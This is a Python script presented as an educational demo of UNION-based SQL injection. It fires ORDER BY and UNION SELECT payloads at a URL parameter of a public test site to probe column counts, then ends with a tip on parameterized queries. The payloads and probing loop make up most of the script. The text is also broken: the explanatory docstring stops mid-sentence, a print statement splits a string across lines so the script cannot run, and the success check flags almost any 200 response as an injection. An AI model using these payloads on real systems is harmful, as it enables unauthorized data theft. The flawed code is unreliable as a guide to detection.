#!/usr/bin/env python3
"""
SQL Injection Demo
==================
Ever wonder how hackers steal data from websites? It's often SQL injection. Here's how it works: When you type into a login form, the website builds a database query. If it doesn't validate your input

⚠️  EDUCATIONAL PURPOSES ONLY — Get proper authorization before testing.
📺  Watch the video walkthrough on our Instagram!
📅  2026-03-01 16:46:48
"""

import requests
import urllib.parse

class SQLiTester:
    """
    Basic SQL injection tester for educational purposes.
    Demonstrates UNION-based SQL injection technique.
    """
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def test_union_injection(self, vulnerable_param):
        """
        Tests for UNION-based SQL injection by attempting to
        determine the number of columns in the query.
        """
        print(f"[+] Testing {self.target_url} for UNION SQLi...")
        
        # Test payloads to determine column count
        payloads = [
            "' ORDER BY 1--",
            "' ORDER BY 5--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--"
        ]
        
        for payload in payloads:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{self.target_url}?{vulnerable_param}={encoded_payload}"
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                # Check for different error indicators
                if "error" not in response.text.lower() and \
                   response.status_code == 200 and \
                   len(response.content) > 0:
                    print(f"  [+] Payload successful: {payload}")
                    print(f"  [+] Possible UNION injection with {payload.count('NULL')} columns")
                    return True
                    
            except requests.exceptions.RequestException as e:
                print(f"  [-] Error with payload {payload}: {e}")
                
        print("  [-] No UNION injection detected")
        return False

# Example usage
if __name__ == "__main__":
    # WARNING: Only test on authorized systems!
    # This is for educational demonstration only
    tester = SQLiTester("http://testphp.vulnweb.com/artists.php")
    tester.test_union_injection("artist")
    print("
⚠️  REMEMBER: Always use parameterized queries!")
    print("   Example: cursor.execute('SELECT * FROM users WHERE id = %s', (user_input,))")
